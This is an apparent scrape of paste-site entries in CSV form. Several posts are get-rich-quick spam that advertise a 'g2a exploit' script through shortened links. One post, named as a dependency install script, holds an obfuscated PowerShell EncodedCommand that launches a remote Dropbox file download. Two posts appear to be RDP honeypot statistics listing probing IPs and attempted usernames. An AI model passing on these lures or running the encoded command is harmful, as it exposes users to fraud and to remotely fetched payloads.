id,title,username,language,date,content
4VQYtEsC,⭐️Earn $2000 a Month [EASY GUIDE]  ND,vvl,JavaScript,Saturday 10th of May 2025 07:24:28 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

OhlrnSa1qV
"
KwhvXfAX,⭐️Earn $2000 a Month [EASY GUIDE]  ND,Chochilandia,JavaScript,Saturday 10th of May 2025 07:20:29 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

xWWLlel6Qi
"
n4dVSfvZ,Black Hole optimization v2 (181 nodes) 50,Johncally,JavaScript,Saturday 10th of May 2025 07:20:06 PM CDT,882078 - check it out at https://tinyurl.com/mpghpdf
7YtNditC,install_dependencies.ps1 15,yerspppppp,JavaScript,Saturday 10th of May 2025 07:19:34 PM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQA5AGEAZgA5AGQANwAwAGUA
QhM8xHfb,2025-05-09_stats.json,rdp_snitch,JSON,Saturday 10th of May 2025 07:18:16 PM CDT,"{
  ""ip"": {
    ""157.245.159.1"": 5679,
    ""143.198.126.238"": 13602,
    ""147.182.237.225"": 3528,
    ""165.232.175.227"": 10359,
    ""143.198.221.164"": 12543,
    ""167.99.10.7"": 13533,
    ""209.97.169.106"": 14958,
    ""67.205.177.1"": 13104,
    ""167.172.131.118"": 13752,
    ""143.198.129.146"": 13428,
    ""45.117.177.2"": 1113,
    ""128.199.211.130"": 9327,
    ""128.199.168.88"": 4119,
    ""128.199.248.18"": 10785,
    ""174.138.21.248"": 7788,
    ""157.245.150.219"": 7041,
    ""128.199.166.57"": 4221,
    ""41.33.88.113"": 57,
    ""71.82.170.60"": 60,
    ""111.89.163.100"": 66,
    ""123.103.219.70"": 18,
    ""211.185.207.14"": 9,
    ""80.94.95.198"": 36,
    ""91.238.181.93"": 6,
    ""213.226.113.3"": 6,
    ""91.238.181.92"": 12,
    ""147.185.132.222"": 9,
    ""80.94.95.203"": 12,
    ""93.123.109.120"": 9,
    ""48.216.243.126"": 3,
    ""47.252.113.102"": 12,
    ""167.94.146.59"": 3,
    ""157.245.104.150"": 9,
    ""147.185.132.45"": 9,
    ""47.236.87.170"": 3,
    ""198.235.24.50"": 9,
    ""154.197.57.94"": 3,
    ""206.168.34.36"": 3,
    ""134.122.128.45"": 3,
    ""185.170.113.100"": 3,
    ""88.214.25.125"": 6,
    ""205.210.31.201"": 9
  },
  ""asn"": {
    ""AS14061"": 157776,
    ""AS131353"": 1113,
    ""AS8452"": 57,
    ""AS20115"": 60,
    ""AS2514"": 66,
    ""AS4826"": 18,
    ""AS4766"": 9,
    ""AS204428"": 48,
    ""AS49434"": 18,
    ""AS34665"": 6,
    ""AS396982"": 36,
    ""AS48090"": 9,
    ""AS8075"": 3,
    ""AS45102"": 15,
    ""AS398705"": 3,
    ""AS135377"": 3,
    ""AS398324"": 3,
    ""AS152194"": 3,
    ""AS197540"": 3,
    ""AS35042"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 157776,
    ""NHANHOA"": 1113,
    ""TE Data"": 57,
    ""Charter Communications"": 60,
    ""NTT PC Communications, Inc."": 66,
    ""Vocus PTY LTD"": 18,
    ""Korea Telecom"": 9,
    ""SS-Net"": 48,
    ""Datacenter location PAR1 France"": 18,
    ""PIN DC"": 6,
    ""Google LLC"": 36,
    ""Techoff SRV Limited"": 9,
    ""Microsoft Corporation"": 3,
    ""Alibaba Cloud LLC"": 12,
    ""Censys, Inc."": 6,
    ""Alibaba (US) Technology Co., Ltd."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""CTG Server Ltd."": 3,
    ""netcup GmbH"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""DigitalOcean, LLC"": 131139,
    ""Digital Ocean"": 26637,
    ""Branch of Nhan Hoa Software Company"": 1113,
    ""Unknown"": 57,
    ""Spectrum"": 60,
    ""InfoSphere"": 66,
    ""Vocus Communications"": 18,
    ""Kornet"": 9,
    ""Unmanaged LTD"": 48,
    ""ThinkTech Technology Industrial CO. Limited"": 24,
    ""IT Hostline Ltd"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Techoff SRV Limited"": 9,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""Alibaba Cloud - US"": 12,
    ""Censys, Inc."": 6,
    ""Alibaba.com LLC"": 3,
    ""Cloud Network HK Co., Limited"": 3,
    ""Rackip Consultancy Pte. LTD"": 3,
    ""netcup GmbH"": 3
  },
  ""regionName"": {
    ""South West"": 76035,
    ""New Jersey"": 53991,
    ""California"": 16992,
    ""Ho Chi Minh"": 1113,
    ""Florida"": 10785,
    ""Dakahlia"": 57,
    ""Wisconsin"": 60,
    ""Tokyo"": 66,
    ""Western Australia"": 18,
    ""Sejong-si"": 9,
    ""Budapest"": 48,
    ""\u00cele-de-France"": 18,
    ""St.-Petersburg"": 6,
    ""Andorra la Vella"": 9,
    ""Virginia"": 15,
    ""Hesse"": 3,
    ""Karnataka"": 9,
    ""North West"": 3,
    ""Kowloon"": 3,
    ""Illinois"": 3,
    ""Central and Western District"": 3,
    ""Bavaria"": 3,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 76038,
    ""United States"": 81846,
    ""Vietnam"": 1113,
    ""Egypt"": 57,
    ""Japan"": 66,
    ""Australia"": 18,
    ""South Korea"": 9,
    ""Hungary"": 48,
    ""France"": 18,
    ""Russia"": 6,
    ""Andorra"": 9,
    ""Germany"": 6,
    ""India"": 9,
    ""Hong Kong"": 12
  },
  ""account"": {
    ""hello"": 158898,
    ""142.93.8.59"": 255,
    ""Test"": 30,
    ""ZaWONmaVg"": 3,
    ""GyvGDd"": 3,
    ""omCHte"": 3,
    ""Administr"": 12,
    ""(empty)"": 15,
    ""nmap"": 3,
    ""aUxtxwBrt"": 3,
    ""dfWfXg"": 3,
    ""EWYLCr"": 3,
    ""nQFsATqXv"": 3,
    ""imasYx"": 3,
    ""JvpcvF"": 3,
    ""Administrator"": 3,
    ""--"": 3,
    ""IFWEwfMFx"": 3,
    ""fmFAAl"": 3,
    ""zNliSX"": 3
  },
  ""keyboard"": {
    ""Unknown"": 159255
  },
  ""client_build"": {
    ""Unknown"": 159255
  },
  ""client_name"": {
    ""Unknown"": 159255
  },
  ""ip_type"": {
    ""hosting"": 158958,
    ""Unknown"": 288,
    ""hosting & proxy"": 9
  }
}"
0ZHza6ed,⭐️MAKE 3000$ IN 1 DAY WITH BTC WG,Chochilandia,JavaScript,Saturday 10th of May 2025 07:17:26 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

RUyDqhpxTr
"
MS821xCp,Bot Reversal-Band-Riot-P1 ETHUSDT.P BYBIT 4H LONG E SHORT 77,Serachids,JavaScript,Saturday 10th of May 2025 07:17:06 PM CDT,410875 - check it out at https://tinyurl.com/v18latest
7VuqJDPi,2025-05-09_stats.json,rdp_snitch,JSON,Saturday 10th of May 2025 07:16:22 PM CDT,"{
  ""ip"": {
    ""157.245.159.1"": 5678,
    ""143.198.126.238"": 13601,
    ""147.182.237.225"": 3528,
    ""165.232.175.227"": 10359,
    ""143.198.221.164"": 12543,
    ""167.99.10.7"": 13533,
    ""209.97.169.106"": 14958,
    ""67.205.177.1"": 13104,
    ""167.172.131.118"": 13752,
    ""143.198.129.146"": 13428,
    ""45.117.177.2"": 1113,
    ""128.199.211.130"": 9327,
    ""128.199.168.88"": 4119,
    ""128.199.248.18"": 10785,
    ""174.138.21.248"": 7788,
    ""157.245.150.219"": 7041,
    ""128.199.166.57"": 4221,
    ""41.33.88.113"": 57,
    ""71.82.170.60"": 60,
    ""111.89.163.100"": 66,
    ""123.103.219.70"": 18,
    ""211.185.207.14"": 9,
    ""80.94.95.198"": 36,
    ""91.238.181.93"": 6,
    ""213.226.113.3"": 6,
    ""91.238.181.92"": 12,
    ""147.185.132.222"": 9,
    ""80.94.95.203"": 12,
    ""93.123.109.120"": 9,
    ""48.216.243.126"": 3,
    ""47.252.113.102"": 12,
    ""167.94.146.59"": 3,
    ""157.245.104.150"": 9,
    ""147.185.132.45"": 9,
    ""47.236.87.170"": 3,
    ""198.235.24.50"": 9,
    ""154.197.57.94"": 3,
    ""206.168.34.36"": 3,
    ""134.122.128.45"": 3,
    ""185.170.113.100"": 3,
    ""88.214.25.125"": 6,
    ""205.210.31.201"": 9
  },
  ""asn"": {
    ""AS14061"": 157774,
    ""AS131353"": 1113,
    ""AS8452"": 57,
    ""AS20115"": 60,
    ""AS2514"": 66,
    ""AS4826"": 18,
    ""AS4766"": 9,
    ""AS204428"": 48,
    ""AS49434"": 18,
    ""AS34665"": 6,
    ""AS396982"": 36,
    ""AS48090"": 9,
    ""AS8075"": 3,
    ""AS45102"": 15,
    ""AS398705"": 3,
    ""AS135377"": 3,
    ""AS398324"": 3,
    ""AS152194"": 3,
    ""AS197540"": 3,
    ""AS35042"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 157774,
    ""NHANHOA"": 1113,
    ""TE Data"": 57,
    ""Charter Communications"": 60,
    ""NTT PC Communications, Inc."": 66,
    ""Vocus PTY LTD"": 18,
    ""Korea Telecom"": 9,
    ""SS-Net"": 48,
    ""Datacenter location PAR1 France"": 18,
    ""PIN DC"": 6,
    ""Google LLC"": 36,
    ""Techoff SRV Limited"": 9,
    ""Microsoft Corporation"": 3,
    ""Alibaba Cloud LLC"": 12,
    ""Censys, Inc."": 6,
    ""Alibaba (US) Technology Co., Ltd."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""CTG Server Ltd."": 3,
    ""netcup GmbH"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""DigitalOcean, LLC"": 131137,
    ""Digital Ocean"": 26637,
    ""Branch of Nhan Hoa Software Company"": 1113,
    ""Unknown"": 57,
    ""Spectrum"": 60,
    ""InfoSphere"": 66,
    ""Vocus Communications"": 18,
    ""Kornet"": 9,
    ""Unmanaged LTD"": 48,
    ""ThinkTech Technology Industrial CO. Limited"": 24,
    ""IT Hostline Ltd"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Techoff SRV Limited"": 9,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""Alibaba Cloud - US"": 12,
    ""Censys, Inc."": 6,
    ""Alibaba.com LLC"": 3,
    ""Cloud Network HK Co., Limited"": 3,
    ""Rackip Consultancy Pte. LTD"": 3,
    ""netcup GmbH"": 3
  },
  ""regionName"": {
    ""South West"": 76034,
    ""New Jersey"": 53990,
    ""California"": 16992,
    ""Ho Chi Minh"": 1113,
    ""Florida"": 10785,
    ""Dakahlia"": 57,
    ""Wisconsin"": 60,
    ""Tokyo"": 66,
    ""Western Australia"": 18,
    ""Sejong-si"": 9,
    ""Budapest"": 48,
    ""\u00cele-de-France"": 18,
    ""St.-Petersburg"": 6,
    ""Andorra la Vella"": 9,
    ""Virginia"": 15,
    ""Hesse"": 3,
    ""Karnataka"": 9,
    ""North West"": 3,
    ""Kowloon"": 3,
    ""Illinois"": 3,
    ""Central and Western District"": 3,
    ""Bavaria"": 3,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 76037,
    ""United States"": 81845,
    ""Vietnam"": 1113,
    ""Egypt"": 57,
    ""Japan"": 66,
    ""Australia"": 18,
    ""South Korea"": 9,
    ""Hungary"": 48,
    ""France"": 18,
    ""Russia"": 6,
    ""Andorra"": 9,
    ""Germany"": 6,
    ""India"": 9,
    ""Hong Kong"": 12
  },
  ""account"": {
    ""hello"": 158896,
    ""142.93.8.59"": 255,
    ""Test"": 30,
    ""ZaWONmaVg"": 3,
    ""GyvGDd"": 3,
    ""omCHte"": 3,
    ""Administr"": 12,
    ""(empty)"": 15,
    ""nmap"": 3,
    ""aUxtxwBrt"": 3,
    ""dfWfXg"": 3,
    ""EWYLCr"": 3,
    ""nQFsATqXv"": 3,
    ""imasYx"": 3,
    ""JvpcvF"": 3,
    ""Administrator"": 3,
    ""--"": 3,
    ""IFWEwfMFx"": 3,
    ""fmFAAl"": 3,
    ""zNliSX"": 3
  },
  ""keyboard"": {
    ""Unknown"": 159253
  },
  ""client_build"": {
    ""Unknown"": 159253
  },
  ""client_name"": {
    ""Unknown"": 159253
  },
  ""ip_type"": {
    ""hosting"": 158956,
    ""Unknown"": 288,
    ""hosting & proxy"": 9
  }
}"
jTVxr0FL,2025-05-09T17:57:32.354182 53,HamdanIsAwesome,JavaScript,Saturday 10th of May 2025 07:16:15 PM CDT,685029 - check it out at https://tinyurl.com/yc4w4vys
DciSYX8g,2025-05-09T17:57:32.354182 65,ii_xjackk,JavaScript,Saturday 10th of May 2025 07:15:37 PM CDT,720739 - check it out at https://tinyurl.com/3u95mw4w
